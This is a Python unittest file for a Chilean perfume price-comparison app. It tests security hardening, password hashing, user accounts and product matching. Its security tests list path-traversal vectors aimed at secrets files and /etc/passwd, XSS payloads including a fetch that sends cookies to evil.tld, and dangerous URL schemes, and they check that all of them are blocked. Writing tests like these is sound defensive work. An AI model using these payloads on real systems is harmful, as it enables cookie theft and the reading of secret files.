import hashlib
import os
import sys
import tempfile
import unittest
from unittest.mock import MagicMock, patch

PROJECT_ROOT = os.path.abspath(os.path.join(os.path.dirname(__file__), ".."))
APP_ROOT = os.path.join(PROJECT_ROOT, "APP")
for p in (APP_ROOT, PROJECT_ROOT):
    if p not in sys.path:
        sys.path.insert(0, p)

import backend.database as db
from backend.normalizador import (
    coincide_entidad_detallada,
    detectar_formato_oferta,
    eliminar_palabras_duplicadas,
    es_producto_perfume_valido,
    limpiar_nombre_perfume,
    normalizar_marca_canonica,
)
from backend.scraper_periodico import _es_vendedor_marketplace_no_verificado
from ui.security import (
    DEFAULT_AVATAR_SVG,
    DEFAULT_PERFUME_IMAGE,
    escape_html,
    formatear_nombre_especifico,
    get_image_src,
    is_valid_https_image_url,
    resolver_url_oferta,
    sanitize_external_url,
)


class TestUISecurityHardening(unittest.TestCase):
    """Pruebas de cierre definitivo de vulnerabilidades LFI, Path Traversal y XSS."""

    def test_lfi_path_traversal_bloqueado_en_get_image_src(self):
        vectores_lfi = [
            "../.streamlit/secrets.toml",
            "../../.streamlit/secrets.toml",
            "APP/.streamlit/secrets.toml",
            "../data/perfumes.db",
            "backend/database.py",
            "C:/Windows/win.ini",
            r"..\..\Windows\System32\drivers\etc\hosts",
            "/etc/passwd",
        ]
        for vector in vectores_lfi:
            with self.subTest(vector=vector):
                res = get_image_src(vector, allow_local=True, default_src=DEFAULT_PERFUME_IMAGE)
                self.assertEqual(res, DEFAULT_PERFUME_IMAGE)

    def test_avatar_usuario_bloquea_rutas_locales_y_http_inseguro(self):
        self.assertEqual(
            get_image_src("assets/cualquier.png", allow_local=False, default_src=DEFAULT_AVATAR_SVG),
            DEFAULT_AVATAR_SVG,
        )
        self.assertEqual(
            get_image_src("http://sitio-inseguro.cl/avatar.png", allow_local=False, default_src=DEFAULT_AVATAR_SVG),
            DEFAULT_AVATAR_SVG,
        )
        self.assertEqual(
            get_image_src("https://cdn.perfumetrending.cl/avatars/u1.png", allow_local=False, default_src=DEFAULT_AVATAR_SVG),
            "https://cdn.perfumetrending.cl/avatars/u1.png",
        )
        self.assertFalse(is_valid_https_image_url("http://ejemplo.cl/a.jpg"))
        self.assertTrue(is_valid_https_image_url("https://ejemplo.cl/a.jpg"))

    def test_data_uri_bloquea_ruptura_de_atributos_xss(self):
        payload_malicioso = 'data:image/png;base64,iVBORw0KGgo=" onerror="alert(document.cookie)'
        self.assertEqual(
            get_image_src(payload_malicioso, allow_local=True, default_src=DEFAULT_PERFUME_IMAGE),
            DEFAULT_PERFUME_IMAGE,
        )
        svg_malicioso = "data:image/svg+xml;utf8,<svg onload='alert(1)'></svg>"
        self.assertEqual(
            get_image_src(svg_malicioso, allow_local=True, default_src=DEFAULT_PERFUME_IMAGE),
            DEFAULT_PERFUME_IMAGE,
        )
        b64_limpio = "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNk+A8AAQUBAScY42YAAAAASUVORK5CYII="
        self.assertEqual(get_image_src(b64_limpio, allow_local=False), b64_limpio)

    def test_escape_html_y_sanitize_external_url(self):
        xss = '<script>fetch("https://evil.tld?c="+document.cookie)</script>'
        escapado = escape_html(xss)
        self.assertNotIn("<script>", escapado)
        self.assertIn("&lt;script&gt;", escapado)

        for url_peligrosa in (
            "javascript:alert(1)",
            "JAVASCRIPT:alert(1)",
            "data:text/html,<script>alert(1)</script>",
            "vbscript:msgbox(1)",
            "file:///etc/passwd",
        ):
            self.assertEqual(sanitize_external_url(url_peligrosa), "#")

        url_con_comillas = 'https://tienda.cl/producto?x=1" onclick="alert(1)'
        limpia = sanitize_external_url(url_con_comillas)
        self.assertNotIn('"', limpia)
        self.assertTrue(limpia.startswith("https://tienda.cl/"))

    def test_resolver_url_oferta_dominios_unificados(self):
        u_alisha = resolver_url_oferta("Alisha Perfumes", "Mod Vanilla", url_prod="", marca="Ariana Grande")
        self.assertTrue(u_alisha.startswith("https://alishaperfumes.cl/search?q="))

        u_oferta = resolver_url_oferta("Oferta Perfumes", "Khamrah", url_prod="", marca="Lattafa")
        self.assertTrue(u_oferta.startswith("https://ofertaperfumes.cl/search?q="))


class TestPasswordCryptoAndDatabaseIntegrity(unittest.TestCase):
    """Pruebas de criptografía PBKDF2, usuarios, favoritos, formatos Tester/Regular y paginación."""

    def setUp(self):
        self.tmpdir = tempfile.TemporaryDirectory()
        self.temp_db_path = os.path.join(self.tmpdir.name, "test_perfumes.db")
        self.patches = [
            patch.object(db, "DB_PATH", self.temp_db_path),
            patch.object(db, "DB_DIR", self.tmpdir.name),
            patch.object(db, "is_supabase_disponible", return_value=False),
            patch.object(db, "get_supabase", return_value=None),
            patch.object(db, "_obtener_admin_auth", return_value=None),
        ]
        for p in self.patches:
            p.start()
        db._INITIALIZED_DB_PATHS.discard(os.path.abspath(self.temp_db_path))
        db.limpiar_cache_catalogo()
        db.init_db()

    def tearDown(self):
        for p in reversed(self.patches):
            p.stop()
        self.tmpdir.cleanup()

    def test_pbkdf2_hash_y_migracion_transparente_sha256(self):
        h1 = db.hash_password("ClaveSegura2026!")
        h2 = db.hash_password("ClaveSegura2026!")
        self.assertTrue(h1.startswith("pbkdf2_sha256$600000$"))
        self.assertNotEqual(h1, h2)  # Sales aleatorias distintas

        ok, rehash = db.verify_password_hash("ClaveSegura2026!", h1)
        self.assertTrue(ok)
        self.assertFalse(rehash)

        bad, _ = db.verify_password_hash("Incorrecta123", h1)
        self.assertFalse(bad)

        legacy_sha = hashlib.sha256("MiClaveAntigua99".encode("utf-8")).hexdigest()
        ok_leg, req_rehash = db.verify_password_hash("MiClaveAntigua99", legacy_sha)
        self.assertTrue(ok_leg)
        self.assertTrue(req_rehash)

    def test_ciclo_completo_usuario_avatar_preferencias_y_favoritos(self):
        # Rechazar contraseña débil (< 8 caracteres)
        ok_short, _ = db.crear_usuario("Ana", "ana@ejemplo.cl", "12345")
        self.assertFalse(ok_short)

        # Registro válido
        ok_reg, _ = db.crear_usuario("Ana Pérez", "ana@ejemplo.cl", "Perfume Seguro 2026")
        self.assertTrue(ok_reg)

        # Rechazar duplicado
        ok_dup, _ = db.crear_usuario("Ana 2", "ANA@ejemplo.cl", "Perfume Seguro 2026")
        self.assertFalse(ok_dup)

        # Login exitoso y sin exposición de password_hash
        ok_login, user = db.verificar_usuario("ana@ejemplo.cl", "Perfume Seguro 2026")
        self.assertTrue(ok_login)
        self.assertIsNotNone(user)
        self.assertNotIn("password_hash", user)
        self.assertEqual(user["nombre"], "Ana Pérez")

        # Validación mágica binaria de avatares: rechazar ejecutable/script disfrazado
        ok_bad_file, _ = db.subir_avatar_usuario(user["id"], b"MZ\x90\x00<script>alert(1)</script>", "image/png")
        self.assertFalse(ok_bad_file)

        png_1x1 = (
            b"\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01"
            b"\x08\x06\x00\x00\x00\x1f\x15\xc4\x89\x00\x00\x00\nIDATx\x9cc\x00\x01"
            b"\x00\x00\x05\x00\x01\r\n-\xb4\x00\x00\x00\x00IEND\xaeB`\x82"
        )
        ok_png, avatar_uri = db.subir_avatar_usuario(user["id"], png_1x1, "image/png")
        self.assertTrue(ok_png)
        self.assertTrue(avatar_uri.startswith("data:image/png;base64,"))

        # Bloquear ruta local en actualizar_perfil_usuario
        ok_lfi_prof, _ = db.actualizar_perfil_usuario(
            user["id"], "Ana Pérez", "ana@ejemplo.cl", "+56911112222", "Bio", "../secrets.toml", "Valdivia"
        )
        self.assertFalse(ok_lfi_prof)

        ok_prof, _ = db.actualizar_perfil_usuario(
            user["id"], "Ana M. Pérez", "ana@ejemplo.cl", "+56911112222", "Coleccionista", avatar_uri, "Valdivia"
        )
        self.assertTrue(ok_prof)

        ok_pref, _ = db.actualizar_preferencias_notificacion(
            user["id"], alerta_email=True, umbral_descuento=20, notif_stock=False, notif_resumen=True
        )
        self.assertTrue(ok_pref)

        perfil = db.obtener_perfil_usuario(user["id"])
        self.assertEqual(perfil["nombre"], "Ana M. Pérez")
        self.assertEqual(perfil["ubicacion"], "Valdivia")
        self.assertEqual(perfil["umbral_descuento"], 20)
        self.assertFalse(perfil["notif_stock"])
        self.assertTrue(perfil["notif_resumen"])

        # Favoritos y detección real de baja de precio
        self.assertTrue(db.agregar_favorito(user["id"], 1))
        self.assertTrue(db.es_favorito(user["id"], 1))
        favs = db.obtener_favoritos_usuario(user["id"])
        self.assertEqual(len(favs), 1)
        precio_inicial = favs[0]["precio_guardado"]
        self.assertGreater(precio_inicial, 0)

        # Registrar una nueva oferta más barata y comprobar baja_detectada=True
        nuevo_precio = max(10000, precio_inicial - 25000)
        db.registrar_observacion_oferta({
            "perfume_id": 1,
            "tienda_id": 1,
            "precio_actual": nuevo_precio,
            "precio_normal": None,  # Verifica que None no rompa NOT NULL
            "en_stock": True,
            "url_producto": "https://www.falabella.com/falabella-cl/product/9999999/bleu-100ml",
            "volumen_ml": 100,
            "formato": "regular",
        })
        favs_post = db.obtener_favoritos_usuario(user["id"])
        self.assertTrue(favs_post[0]["baja_detectada"])
        self.assertEqual(favs_post[0]["mejor_precio_actual"], nuevo_precio)

        self.assertTrue(db.eliminar_favorito(user["id"], 1))
        self.assertFalse(db.es_favorito(user["id"], 1))

    def test_separacion_formato_regular_vs_tester_y_retiro_tras_5_fallos(self):
        # Insertar un perfume nuevo sellado a $89.990 y un Tester a $54.990
        res_reg = db.guardar_o_actualizar_perfume_scraped(
            nombre="Sauvage Eau de Parfum",
            marca="Christian Dior",
            precio_actual=89990,
            precio_normal=109990,
            tienda_nombre="Paris",
            url_producto="https://www.paris.cl/dior-sauvage-edp-100ml.html",
            volumen_ml=100,
            tipo="Eau de Parfum",
            formato="regular",
        )
        self.assertTrue(res_reg["exito"])
        pid = res_reg["perfume_id"]

        res_tst = db.guardar_o_actualizar_perfume_scraped(
            nombre="Tester Dior Sauvage EDP 100ml",
            marca="Dior",
            precio_actual=54990,
            precio_normal=89990,
            tienda_nombre="Silk Perfumes",
            url_producto="https://www.silkperfumes.cl/products/tester-dior-sauvage-edp-100ml",
            volumen_ml=100,
            tipo="Eau de Parfum",
            formato="tester",
        )
        self.assertTrue(res_tst["exito"])
        # Normalización canónica de marca ('Christian Dior' == 'Dior') une el mismo perfume pero separa la variante tester
        self.assertEqual(res_tst["perfume_id"], pid)

        catalogo = db.obtener_catalogo(busqueda="Sauvage")
        item_cat = next(p for p in catalogo if p["id"] == pid)
        # El precio de portada del catálogo debe priorizar el producto Regular ($89.990) sobre el Tester ($54.990)
        self.assertEqual(item_cat["mejor_precio"], 89990)

        precios_ficha = db.obtener_precios_actuales(pid)
        formatos = {p["tienda_nombre"]: p["formato"] for p in precios_ficha}
        self.assertEqual(formatos.get("Paris"), "regular")
        self.assertEqual(formatos.get("Silk Perfumes"), "tester")

        # Verificar que tras 5 fallos consecutivos la oferta pasa a 'requiere_revision' sin borrar su último precio
        with db.get_db_cursor() as cur:
            cur.execute(
                "SELECT oa.variante_id, oa.tienda_id FROM ofertas_actuales oa "
                "JOIN variantes_perfume vp ON vp.id = oa.variante_id "
                "WHERE vp.perfume_id = ? AND vp.formato = 'regular';",
                (pid,),
            )
            row_oa = cur.fetchone()

        estado_final = None
        for i in range(5):
            r_fail = db.registrar_fallo_scraping(
                tienda_id=row_oa["tienda_id"],
                variante_id=row_oa["variante_id"],
                mensaje=f"Timeout simulado #{i + 1}",
            )
            estado_final = r_fail["estado"]
            self.assertEqual(r_fail["precio_actual"], 89990)
        self.assertEqual(estado_final, "requiere_revision")

        # Trazabilidad de scraping_runs normalizando 'completado' -> 'exitoso'
        run_id = db.iniciar_scraping_run("periodico", mensaje_detalle="Test unitario")
        self.assertIsNotNone(run_id)
        db.finalizar_scraping_run(run_id, estado="completado", productos_procesados=10, cambios_precio=2)
        with db.get_db_cursor() as cur:
            cur.execute("SELECT estado, productos_procesados, cambios_precio FROM scraping_runs WHERE id = ?;", (run_id,))
            row_run = cur.fetchone()
            self.assertEqual(row_run["estado"], "exitoso")
            self.assertEqual(row_run["productos_procesados"], 10)
            self.assertEqual(row_run["cambios_precio"], 2)

    def test_paginacion_automatica_fetch_all_rows_supera_1000_filas(self):
        total_filas = 2450
        dataset = [{"id": i} for i in range(1, total_filas + 1)]

        def fake_query(offset: int, limit: int):
            mock_exec = MagicMock()
            mock_exec.execute.return_value = MagicMock(data=dataset[offset : offset + limit])
            return mock_exec

        resultado = db._fetch_all_rows(fake_query, page_size=1000)
        self.assertEqual(len(resultado), total_filas)
        self.assertEqual(resultado[0]["id"], 1)
        self.assertEqual(resultado[-1]["id"], total_filas)


class TestEntityResolutionProductionRegressions(unittest.TestCase):
    """Regresiones reales encontradas durante la auditoría del catálogo de producción."""

    def test_bloquea_cosmeticos_en_gramos_sachets_perfumeros_combos_y_decants(self):
        casos_invalidos = [
            ("Labial Rouge Dior Forever 3,2G", "Dior"),
            ("Crema Corporal Hidratante 75 gr", "Carolina Herrera"),
            ("Sachet Aromático Lavanda Closet", "Maison"),
            ("Perfumero Recargable Portátil De Vidrio 5ml", "Genérico"),
            ("Polo Red EDT 125ml + Polo 67 EDT 40ml", "Ralph Lauren"),
            ("Decant Creed Aventus 10ml", "Creed"),
        ]
        for titulo, marca in casos_invalidos:
            with self.subTest(titulo=titulo):
                self.assertFalse(es_producto_perfume_valido(titulo, marca=marca))

    def test_preserva_for_him_for_her_y_flankers_en_limpiar_nombre(self):
        n_him = limpiar_nombre_perfume("Calvin Klein CK One Shock For Him EDT 200ml", "Calvin Klein")
        n_her = limpiar_nombre_perfume("Calvin Klein CK One Shock For Her EDT 200ml", "Calvin Klein")
        self.assertNotEqual(n_him.lower(), n_her.lower())
        self.assertIn("for him", n_him.lower())
        self.assertIn("for her", n_her.lower())

        n_elixir = limpiar_nombre_perfume("Dior Sauvage Elixir 60ml", "Dior")
        self.assertIn("elixir", n_elixir.lower())

        self.assertEqual(normalizar_marca_canonica("Maison Al Hambra"), "Maison Alhambra")
        self.assertEqual(normalizar_marca_canonica("Christian Dior"), "Dior")
        self.assertEqual(detectar_formato_oferta("Perfume Versace Eros 100ml (Tester)"), "tester")
        self.assertEqual(detectar_formato_oferta("Perfume Versace Eros 100ml EDP"), "regular")

    def test_filtro_vendedores_marketplace_terceros(self):
        self.assertFalse(_es_vendedor_marketplace_no_verificado("Falabella", "Dior", "Sauvage"))
        self.assertFalse(_es_vendedor_marketplace_no_verificado("Ripley", "Chanel", "Bleu de Chanel"))
        self.assertFalse(_es_vendedor_marketplace_no_verificado("Silk Perfumes", "Versace", "Eros"))
        self.assertTrue(_es_vendedor_marketplace_no_verificado("Importadora X SpA", "Dior", "Sauvage"))
        self.assertTrue(_es_vendedor_marketplace_no_verificado("Perfumes Alternativos Chile", "Lattafa", "Khamrah"))

    def test_coincide_entidad_rechaza_cruces_reales_de_produccion(self):
        # Caso real oferta 7375: Terre d'Hermès infiltrado en Versace Pour Homme
        r1 = coincide_entidad_detallada(
            titulo="Terre d'Hermes Eau de Toilette 200 ml",
            perfume_nombre="Pour Homme",
            marca="Versace",
            concentracion="Eau de Toilette",
            volumen_esperado=200,
        )
        self.assertFalse(r1.coincide)

        # Caso real oferta 1468: Lacoste Rose Sparkling infiltrado en Lacoste Pour Homme
        r2 = coincide_entidad_detallada(
            titulo="Lacoste Eau de Lacoste L.12.12 Rose Sparkling Tester EDT 100ml Mujer",
            perfume_nombre="Pour Homme",
            marca="Lacoste",
            concentracion="Eau de Toilette",
            volumen_esperado=100,
        )
        self.assertFalse(r2.coincide)

    def test_formatear_nombre_especifico(self):
        # Caso Romance: nombre corto genérico 'Romance', marca Ralph Lauren, Mujer, Eau de Parfum
        p_romance = {"nombre": "Romance", "marca": "Ralph Lauren", "genero": "Mujer", "tipo": "Eau de Parfum"}
        self.assertEqual(formatear_nombre_especifico(p_romance), "Romance Mujer EDP")

        # Caso Eros Mujer: nombre 'Eros', Versace, Mujer, Eau de Parfum
        p_eros_m = {"nombre": "Eros", "marca": "Versace", "genero": "Mujer", "tipo": "Eau de Parfum"}
        self.assertEqual(formatear_nombre_especifico(p_eros_m), "Eros Mujer EDP")

        # Caso Eros Hombre: nombre 'Eros', Versace, Hombre, Eau de Toilette
        p_eros_h = {"nombre": "Eros", "marca": "Versace", "genero": "Hombre", "tipo": "Eau de Toilette"}
        self.assertEqual(formatear_nombre_especifico(p_eros_h), "Eros Hombre EDT")

        # Caso con género explícito en el nombre: no debe redundar
        p_pour_homme = {"nombre": "Sauvage Pour Homme", "marca": "Dior", "genero": "Hombre", "tipo": "Eau de Toilette"}
        self.assertEqual(formatear_nombre_especifico(p_pour_homme), "Sauvage Pour Homme EDT")

        # Caso corto sin género explícito: debe incluir género
        p_sauvage = {"nombre": "Sauvage Elixir", "marca": "Dior", "genero": "Hombre", "tipo": "Elixir"}
        self.assertEqual(formatear_nombre_especifico(p_sauvage), "Sauvage Elixir Hombre")

    def test_eliminar_palabras_duplicadas(self):
        # Caso duplicado técnico por scrapers
        self.assertEqual(
            eliminar_palabras_duplicadas("Good Girl Jasmine Absolute Absolute"),
            "Good Girl Jasmine Absolute"
        )
        self.assertEqual(
            eliminar_palabras_duplicadas("Oud Candy Extrait Extrait De"),
            "Oud Candy Extrait De"
        )
        # Nombres comerciales legítimos con repetición deben preservarse
        self.assertEqual(eliminar_palabras_duplicadas("Anais Anais"), "Anais Anais")
        self.assertEqual(eliminar_palabras_duplicadas("Amor Amor"), "Amor Amor")
        self.assertEqual(eliminar_palabras_duplicadas("Can Can"), "Can Can")
        self.assertEqual(eliminar_palabras_duplicadas("Plus Plus"), "Plus Plus")

    def test_coincide_entidad_rechazo_genero_cruzado(self):
        # Oferta masculina intentando asociarse a perfume femenino
        r_fem = coincide_entidad_detallada(
            titulo="Versace Eros Pour Homme EDT 200 ml",
            perfume_nombre="Eros",
            marca="Versace",
            concentracion="Eau de Parfum",
            volumen_esperado=200,
            genero_esperado="Mujer"
        )
        self.assertFalse(r_fem.coincide)
        self.assertIn("Conflicto de género", r_fem.motivo)

        # Oferta femenina intentando asociarse a perfume masculino
        r_masc = coincide_entidad_detallada(
            titulo="Perfume Mujer Romance EDP 100ml Polo Ralph Lauren",
            perfume_nombre="Romance",
            marca="Ralph Lauren",
            concentracion="Eau de Toilette",
            volumen_esperado=100,
            genero_esperado="Hombre"
        )
        self.assertFalse(r_masc.coincide)
        self.assertIn("Conflicto de género", r_masc.motivo)


if __name__ == "__main__":
    unittest.main()
